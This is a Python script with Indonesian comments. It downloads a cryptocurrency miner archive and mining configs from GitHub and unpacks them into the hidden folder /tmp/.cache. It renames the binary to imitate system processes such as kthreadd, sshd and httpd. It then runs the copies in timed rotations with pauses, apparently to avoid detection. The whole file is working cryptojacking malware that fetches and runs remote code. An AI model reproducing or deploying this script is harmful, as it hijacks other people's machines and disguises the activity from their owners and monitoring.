import os
import urllib.request
import tarfile
import shutil
import time
import subprocess

base_path = "/tmp/.cache"
binary_names = ["kthreadd.", "systemd-journald.", "sshd.", "httpd."]
config_links = [
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/US-1.ini",
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/US-2.ini",
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/DE-1.ini",
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/DE-3.ini",
]
miner_url = "https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz"

def setup_folders():
    print("[Poppy] Setup folder dan download file...")
    os.makedirs(base_path, exist_ok=True)

    # Download dan extract miner
    archive_path = os.path.join(base_path, "cache.tar.gz")
    extract_path = os.path.join(base_path, "cache")

    if not os.path.exists(extract_path):
        print("[Poppy] Downloading cache.tar.gz...")
        urllib.request.urlretrieve(miner_url, archive_path)

        print("[Poppy] Extracting miner...")
        with tarfile.open(archive_path, "r:gz") as tar:
            tar.extractall(base_path)

        os.remove(archive_path)

    # Copy ke folder kerja
    for i in range(4):
        folder = os.path.join(base_path, str(i + 1))
        os.makedirs(folder, exist_ok=True)

        bin_src = extract_path
        bin_dst = os.path.join(folder, binary_names[i])

        # Stop proses kalau masih jalan
        subprocess.run(f"pkill -f {binary_names[i]}", shell=True)
        time.sleep(1)

        # Copy file miner ke folder
        if os.path.isfile(bin_src):
            shutil.copy2(bin_src, bin_dst)
            os.chmod(bin_dst, 0o755)
        else:
            print(f"[Poppy] File bin tidak ditemukan: {bin_src}")
            continue

        # Download config jika belum ada
        config_path = os.path.join(folder, "config.ini")
        if not os.path.exists(config_path):
            print(f"[Poppy] Downloading config {i+1}...")
            urllib.request.urlretrieve(config_links[i], config_path)

    # Hapus file utama setelah copy
    try:
        os.remove(extract_path)
    except FileNotFoundError:
        pass

def run_rotasi():
    print("[Poppy] Mulai rotasi kerja panen...")
    max_loop = 10
    run_duration = 15 * 60
    rest_duration = 2 * 60
    long_rest = 5 * 60

    folder_index = 0

    while True:
        for loop in range(max_loop):
            folder = os.path.join(base_path, str(folder_index + 1))
            binary = os.path.join(folder, binary_names[folder_index])

            print(f"[Poppy] [{loop+1}/{max_loop}] Menjalankan: {binary}")
            proc = subprocess.Popen(binary, cwd=folder)

            time.sleep(run_duration)

            print("[Poppy] Menghentikan proses...")
            subprocess.run(f"pkill -f {binary_names[folder_index]}", shell=True)
            time.sleep(rest_duration)

            folder_index = (folder_index + 1) % 4

        print("[Poppy] Long rest 10 menit...")
        for name in binary_names:
            subprocess.run(f"pkill -f {name}", shell=True)
        time.sleep(long_rest)

# Jalankan semua
setup_folders()
run_rotasi()
